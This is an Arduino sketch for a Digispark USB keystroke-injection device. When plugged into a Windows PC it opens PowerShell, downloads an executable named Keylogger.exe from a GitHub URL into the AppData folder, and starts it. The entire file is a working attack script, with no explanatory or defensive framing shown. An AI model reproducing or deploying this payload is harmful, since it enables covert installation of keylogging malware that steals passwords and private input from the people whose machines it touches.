#define kbd_es_es
#include "DigiKeyboard.h"
 
void setup() {
  DigiKeyboard.update();
  pinMode(1, OUTPUT);
  DigiKeyboard.delay(5000);
}
 
void loop() {
  delay(1000);
  DigiKeyboard.update();
  delay(100);
   
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  delay(100);
  DigiKeyboard.println(F("powershell "));
  delay(100);
  DigiKeyboard.print(F("Import-Module BitsTransfer;"));
  DigiKeyboard.print(F("Start-BitsTransfer -Source \"https://github.com/ContiGianfranco/keylogger_cripto/blob/main/compiled/Keylogger.exe?raw=true\" -Destination \"APPDATA\\Roaming\\Keylogger.exe\";"));
  DigiKeyboard.print(F("cd \"APPDATA\\Roaming\";"));
  DigiKeyboard.println(F("Start-Process \"Keylogger.exe\";"));
   
  while(1){
    digitalWrite(1, HIGH);
    delay(1000);
    digitalWrite(1, LOW);
    delay(1000);
  }
}